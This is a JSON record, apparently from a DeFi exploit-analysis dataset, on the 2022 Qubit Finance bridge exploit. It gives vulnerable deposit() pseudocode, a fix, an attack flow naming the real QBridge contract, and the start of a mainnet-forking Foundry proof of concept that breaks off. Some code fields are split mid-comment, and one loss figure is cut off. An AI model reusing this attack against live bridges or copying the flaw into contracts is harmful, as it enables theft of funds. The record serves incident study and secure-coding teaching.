@@ -1,0 +1,33 @@
+{
+ "id": "2022__2022-01-27_Qubit_DepositZeroAddressWhitelist",
+ "source_file": "2022/2022-01-27_Qubit_DepositZeroAddressWhitelist.md",
+ "title": "Qubit Finance — Zero-Address Whitelist Exploit Bridge Takeover Analysis",
+ "date": "2022-01-27",
+ "protocol": "Qubit Finance",
+ "chain": "Ethereum → BSC",
+ "loss_raw": "~$80,000,000 (xETH-based BSC collateral drained)",
+ "loss_usd": 80000000.0,
+ "root_cause": "The `deposit()` function treated the zero address (0x0000...0000) as a valid whitelisted token, allowing xETH to be minted on BSC without any ETH being transferred",
+ "attack_tx": "Block 14,090,169",
+ "vulnerable_contract": "QBridge 0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable QBridgeHandler.deposit() (pseudocode)\nfunction deposit(\n    bytes32 resourceID,\n    address depositer,\n    bytes calldata data\n) external onlyBridge {\n    address tokenAddress = _resourceIDToTokenContractAddress[resourceID];\n\n    //",
+  "❌ Zero address is registered in the whitelist, so this passes\n    require(_contractWhitelist[tokenAddress], \"token not whitelisted\");\n\n    //",
+  "❌ When tokenAddress == address(0), ERC20 transferFrom call is skipped\n    // Does not verify whether native ETH was actually transferred\n    if (tokenAddress != address(0)) {\n        uint256 amount = abi.decode(data, (uint256));\n        IERC20(tokenAddress).transferFrom(depositer, address(this), amount);\n    }\n    //"
+ ],
+ "code_after": [
+  "✅ Correct pattern\nfunction deposit(...) external payable onlyBridge {\n    address tokenAddress = _resourceIDToTokenContractAddress[resourceID];\n    require(_contractWhitelist[tokenAddress], \"token not whitelisted\");\n\n    if (tokenAddress == address(0)) {\n        //",
+  "✅ Validate native ETH receipt\n        require(msg.value == amount, \"ETH amount mismatch\");\n    } else {\n        IERC20(tokenAddress).transferFrom(depositer, address(this), amount);\n    }\n}"
+ ],
+ "steps": [
+  "→ Returns: 0x0000000000000000000000000000000000000000 (zero address)",
+  "→ true (zero address is in the whitelist!)"
+ ],
+ "other_code": [
+  "Attacker (Ethereum)\n    │\n    ├─[1] Query resourceID\n    │       QBridgeHandler.resourceIDToTokenContractAddress(resourceID)\n    │       → Returns: 0x0000000000000000000000000000000000000000 (zero address)\n    │\n    ├─[2] Check contractWhitelist\n    │       QBridgeHandler.contractWhitelist(address(0))\n    │       → true (zero address is in the whitelist!)\n    │\n    ├─[3] Call QBridge.deposit()\n    │       destinationDomainID = 1 (BSC)\n    │       resourceID = resourceID for ETH\n    │       data = abi.encode(massive xETH mint request)\n    │       ETH sent: 0 wei\n    │\n    ├─[4] Bridge relayer confirms xETH mint on BSC\n    │       (Trusts Ethereum event and approves BSC mint)\n    │\n    └─[5] Borrow against entire Qubit protocol collateral using minted xETH on BSC\n            Loss: ~$80,000,0",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IQBridge {\n    function deposit(\n        uint8 destinationDomainID,\n        bytes32 resourceID,\n        bytes calldata data\n    ) external payable;\n}\n\ninterface IQBridgeHandler {\n    function resourceIDToTokenContractAddress(bytes32 resourceID)\n        external view returns (address);\n    function contractWhitelist(address token)\n        external view returns (bool);\n}\n\ncontract ContractTest is Test {\n    IQBridge qBridge =\n        IQBridge(0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6);\n    IQBridgeHandler qBridgeHandler =\n        IQBridgeHandler(0x17B7163cf1Dbd286E262ddc68b553D899B93f526);\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 14_090_169);\n    }\n\n    functi"
+ ]
+}
